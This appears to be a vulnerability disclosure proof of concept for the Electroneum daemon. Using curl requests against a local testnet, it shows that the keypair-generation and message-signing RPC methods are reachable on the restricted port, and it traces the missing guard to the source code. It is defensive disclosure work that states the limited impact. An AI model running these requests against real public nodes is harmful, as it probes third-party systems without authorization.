# RPC Restriction Bypass — Proof of Concept

## Prerequisites

- Local build of `electroneumd` from source (do NOT test against production nodes)
- Two terminal sessions
- `curl` installed

## Setup (Local Test Environment Only)

### Terminal 1 — Start daemon with restricted RPC port

```bash
# Build from source
make release

# Start daemon with BOTH unrestricted (local) and restricted (simulating public) ports
./build/release/bin/electroneumd \
    --testnet \
    --rpc-bind-ip 127.0.0.1 \
    --rpc-bind-port 26968 \
    --rpc-restricted-bind-port 26969 \
    --data-dir /tmp/etn-testnet \
    --log-level 2
```

Port 26968 = unrestricted (admin), port 26969 = restricted (public-facing).

### Terminal 2 — Demonstrate the bypass

#### Step 1: Verify restricted mode blocks admin endpoints

```bash
# This SHOULD be blocked on restricted port (and IS blocked):
curl -s http://127.0.0.1:26969/json_rpc -d '{
  "jsonrpc":"2.0", "id":"0", "method":"set_validator_key",
  "params":{"key":"deadbeef..."}
}' | python3 -m json.tool

# Expected: Method not found or empty response (blocked by !m_restricted guard)
```

#### Step 2: Demonstrate generate_ed25519_keypair is NOT blocked

```bash
# This SHOULD be blocked on restricted port but IS NOT:
curl -s http://127.0.0.1:26969/json_rpc -d '{
  "jsonrpc":"2.0", "id":"0", "method":"generate_ed25519_keypair"
}' | python3 -m json.tool

# Expected (VULNERABLE): Returns {"privateKey":"<hex>", "publicKey":"<hex>", "status":"OK"}
# Expected (FIXED): Method not found or blocked response
```

#### Step 3: Demonstrate sign_message is NOT blocked

```bash
# Use a TEST-ONLY throwaway key (generate one with step 2, or use this dummy):
TESTKEY="0000000000000000000000000000000000000000000000000000000000000001"

curl -s http://127.0.0.1:26969/json_rpc -d '{
  "jsonrpc":"2.0", "id":"0", "method":"sign_message",
  "params":{"privateKey":"'"$TESTKEY"'", "message":"test message"}
}' | python3 -m json.tool

# Expected (VULNERABLE): Returns {"signature":"<hex>", "status":"OK"}
# Expected (FIXED): Method not found or blocked response
```

#### Step 4: Verify same endpoints work on unrestricted port (control test)

```bash
# Same requests against unrestricted port 26968 — should always work:
curl -s http://127.0.0.1:26968/json_rpc -d '{
  "jsonrpc":"2.0", "id":"0", "method":"generate_ed25519_keypair"
}' | python3 -m json.tool
# Expected: Returns keypair (this is correct — unrestricted port allows admin endpoints)
```

## Expected vs. Actual Results

| Endpoint | Port | Expected | Actual |
|----------|------|----------|--------|
| `set_validator_key` | 26969 (restricted) | Blocked | Blocked |
| `generate_ed25519_keypair` | 26969 (restricted) | Blocked | **Dispatched** |
| `sign_message` | 26969 (restricted) | Blocked | **Dispatched** |
| `inject_emergency_vlist` | 26969 (restricted) | Blocked | Blocked |
| `generate_ed25519_keypair` | 26968 (unrestricted) | Dispatched | Dispatched |
| `sign_message` | 26968 (unrestricted) | Dispatched | Dispatched |

## Root Cause (Source Evidence)

`src/rpc/core_rpc_server.h:176-179`:
```
176: MAP_JON_RPC_WE_IF("set_validator_key", ..., !m_restricted)      // guarded
177: MAP_JON_RPC_WE("generate_ed25519_keypair", ...)                  // NOT guarded
178: MAP_JON_RPC_WE("sign_message", ...)                              // NOT guarded
179: MAP_JON_RPC_WE_IF("inject_emergency_vlist", ..., !m_restricted)  // guarded
```

`MAP_JON_RPC_WE` expands to `MAP_JON_RPC_WE_IF(..., true)` (line 194 of `http_server_handlers_map2.h`), hardcoding the condition to `true` and bypassing the `m_restricted` check.

## What This Does NOT Demonstrate

- Neither endpoint exposes the node's validator key or any pre-existing secret
- `generate_ed25519_keypair` creates a NEW random key (not the node's key)
- `sign_message` requires the caller to supply their own private key
- This is NOT a signing oracle using node-held keys

## Safety Notes

- All testing must use a local testnet instance
- Never test against production Electroneum nodes
- The dummy key `0000...0001` is for demonstration only
- No real funds or validator keys are involved
